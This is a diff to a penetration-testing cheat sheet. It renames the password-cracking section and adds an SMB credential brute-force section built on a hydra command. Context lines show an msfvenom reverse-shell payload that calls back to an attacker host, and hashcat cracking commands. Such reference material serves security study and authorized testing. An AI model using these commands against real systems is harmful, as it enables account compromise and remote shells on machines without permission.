@@ -8,7 +8,8 @@
 ### [Windows Privilege Escalation](#Windows-Privilege-Escalation-1)
 ### [Compilation](#Compilation-1)
 ### [MSFvenom Payload Generation](#MSFvenom-Payload-Generation-1)
-### [Password Cracking](#Password-Cracking-1)
+### [Hash Cracking](#Hash-Cracking-1)
+### [Credential Brute-Force](#Credential-Brute---Force-1)
 
 
 ## Initial Recon
@@ -833,7 +834,7 @@ $ msfvenom -p linux/x86/shell_reverse_tcp LHOST=[kali] LPORT=443 -f js_le -e gen
 ```
 
 
-## Password Cracking
+## Hash Cracking
 
 Online hash cracker: https://crackstation.net/
 
@@ -850,3 +851,10 @@ $ hash-identifier [hash]
 $ hashcat -m [hash-type] -a 0 [hash-file] [wordlist] -o cracked.txt
 ```
 
+## Credential-Brute Force
+
+**THIS SHOULD BE THE LAST OPTION IF YOU CANNOT FIND AN ENTRYPOINT**
+
+```
+$ hydra -V -f -l [username] -P [/path/to/wordlist] smb # smb brute-force
+```
